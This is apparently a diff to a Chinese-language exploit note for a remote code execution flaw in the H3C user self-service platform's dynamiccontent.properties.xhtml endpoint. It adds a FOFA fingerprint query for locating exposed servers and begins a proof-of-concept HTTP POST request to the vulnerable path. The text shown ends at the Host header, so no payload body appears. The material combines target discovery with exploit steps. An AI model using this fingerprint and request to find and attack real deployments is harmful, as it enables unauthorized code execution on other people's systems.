@@ -1,7 +1,13 @@
 ## H3C 用户自助服务平台 dynamiccontent.properties.xhtml存在RCE漏洞
 
+## fofa
+
+```
+fid="tPmVs5PL6e9m5Xt0J4V2+A=="
+```
 
 ## poc
+
 ```
 POST /mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
 Host: 127.0.0.1
